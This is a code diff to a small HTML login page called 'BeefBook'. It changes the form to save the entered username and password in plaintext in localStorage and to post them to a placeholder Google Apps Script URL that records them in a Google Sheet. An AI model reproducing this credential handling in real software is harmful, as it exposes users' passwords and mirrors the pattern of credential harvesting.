@@ -7,34 +7,41 @@
 <body style="background-color: Violet;">
   <h1 style="font-family: Verdana;">BeefBook</h1>
 
-  <form id="submitForm" action="PASTE_YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL_HERE" method="POST">
+  <form id="submitForm">
     <label>Username:</label><br>
-    <input type="text" name="username" id="uname" required><br><br>
+    <input type="text" id="uname" required><br><br>
 
     <label>Code:</label><br>
-    <textarea name="password" id="code" required></textarea><br><br>
+    <textarea id="code" required></textarea><br><br>
 
     <input type="submit" value="Submit">
   </form>
 
   <script>
-    // Save locally on submit, then let the form POST normally
-    document.getElementById('submitForm').onsubmit = function() {
+    const URL = 'PASTE_YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL_HERE';
+
+    document.getElementById('submitForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+
       const uname = document.getElementById('uname').value.trim();
       const code = document.getElementById('code').value.trim();
 
-      // Save to localStorage for logged-in page
+      // 1️⃣ Save locally for logged-in page
       localStorage.setItem('username', uname);
       localStorage.setItem('code', code);
 
-      // Redirect after a short delay to ensure form submission completes
+      // 2️⃣ Send data to Google Sheets (your existing working fetch)
+      fetch(URL, {
+        method: 'POST',
+        mode: 'no-cors', // works with your existing script
+        body: JSON.stringify({ username: uname, password: code })
+      });
+
+      // 3️⃣ Redirect after a tiny delay so fetch can fire
       setTimeout(() => {
         window.location.href = './BBlogedin.html';
-      }, 300);
-
-      // Allow form to submit normally to Google Apps Script
-      return true;
-    };
+      }, 300); // 300ms is enough
+    });
   </script>
 </body>
 </html>
